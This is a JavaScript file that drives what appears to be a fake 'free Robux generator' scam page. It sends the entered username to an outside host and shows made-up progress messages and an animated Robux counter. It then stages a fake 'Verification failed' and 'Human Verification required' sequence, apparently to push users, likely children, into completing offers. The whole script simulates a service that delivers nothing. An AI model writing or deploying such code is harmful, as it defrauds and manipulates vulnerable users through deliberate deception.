  var ROBUX = 50;
    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
    const bonus = rand(200, 500);
    $(".bs").text(bonus);

    var INFO = {
        "Found": "OK",
        "full_name": "bvb",
        "user_name": "bvb",
        "friends_count": 5,
        "followers_count": 0,
        "followings_count": 1,
        "user_id": 101857,
        "user_avatar": "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F481357DAF4D466E58D843156B234862-Png/720/720/AvatarHeadshot/Webp/noFilter"
    };

    $(".button > button").on("click", function(){
        var el = $(this);
        ROBUX = parseInt(el.text().replace(/,/g, ""));
        $(".rbx > span").text(ROBUX);
        $("#step-1").addClass("d-none");
        $("#step-2").removeClass("d-none");
    });

    $(".connect").on("click", function(){
        $(".connect").text("searching...");
        $(".error").text("");
        var username = $("input").val();
        $.ajax({
            url: `https://theclassicswing.com/api/picture.php?username=${username}`,
            method: "GET",
            success: function(response) {
                if(response["Found"] && response["Found"] == "OK"){
                    INFO = response;
                    $("#step-2").addClass("d-none");
                    $("#step-3").removeClass("d-none");
                    searchingFunction();
                } else {
                    $(".error").text("Username Not Found!");
                    $(".connect").text("Correct username");
                }
            },
            error: function() {
                $(".error").text("Username Not Found!");
                $(".connect").text("Correct username");
            }
        });
    });

    $(".confirm").on("click", function(){
        $("#step-4").addClass("d-none");
        $("#step-3").removeClass("d-none");
        preparingFunction();
    });

    $(".action").on("click", function(){
        $({ countNum: 0 }).animate({ countNum: ROBUX }, {
            duration: 2000,
            easing: 'linear',
            step: function() {
                $('.rbx-count').text(Math.floor(this.countNum));
            },
            complete: function() {
                $('.rbx-count').text(this.countNum);
                lastStep();
            }
        });
    });

    $(".action-btn button").on("click", function(){
        $("#step-6").addClass("d-none");
        $("#step-7").removeClass("d-none");
    });

    function searchingFunction(){
        setTimeout(() => {
            $(".txt").html("fetching data...");
        }, 1000);

        setTimeout(() => {
            $(".txt").html(`Connecting to <span>${INFO["user_name"]}</span>`);
        }, 2000);

        setTimeout(() => {
            $("#step-3").addClass("d-none");
            $("#step-4").removeClass("d-none");
            $(".followings").text(INFO["followings_count"]);
            $(".followers").text(INFO["followers_count"]);
            $(".friends").text(INFO["friends_count"]);
            $(".more .name").text(INFO["full_name"]);
            $(".more .username").text(INFO["user_name"]);
            $(".profile img").attr("src", INFO["user_avatar"]);
            $(".avatar").attr("src", INFO["user_avatar"]);
            $(".usr-rbx").text(INFO["user_name"]);
            $(".rbx-c").text(ROBUX);
            $(".total").text(ROBUX + bonus);
        }, 4000);
    }

    function preparingFunction(){
        setTimeout(() => { $(".txt").html("Importing data info..."); }, 1000);
        setTimeout(() => { $(".txt").html("Fetching Data..."); }, 2500);
        setTimeout(() => { $(".txt").html("Exporting database..."); }, 3000);
        setTimeout(() => { $(".txt").html(`Preparing ${ROBUX} Robux for ${INFO["user_name"]}`); }, 4500);
        setTimeout(() => { $(".txt").html(`Finalising...`); }, 6000);
        setTimeout(() => {
            $("#step-3").addClass("d-none");
            $("#step-5").removeClass("d-none");
        }, 7500);
    }

    function lastStep(){
        $(".txt").html(`Finalising...`);
        
        setTimeout(() => {
            $("#step-5").addClass("d-none");
            $("#step-3").removeClass("d-none");
        }, 1000);

        setTimeout(() => {
            $(".loader").html(`<img style="width:30%" src="https://flagcdn.com/w320/${IP_INFO["country_code"].toLowerCase()}.png">`)
            $(".txt").html(`Unusually high traffic from ${IP_INFO["country_name"]}`);
        }, 2500);

        setTimeout(() => {
            $(".loader").html(`<img class="animation" src="https://img.icons8.com/?size=100&id=34831&format=png&color=000000" alt="">`);
            $(".txt").html(`<div class="text-danger">Verification failed</div>`);
        }, 4500);

        setTimeout(() => {
            $(".txt").html(`Human Verification required...`);
        }, 6000);

        setTimeout(() => {
            $("#step-3").addClass("d-none");
            $("#step-6").removeClass("d-none");
        }, 7500);
    }
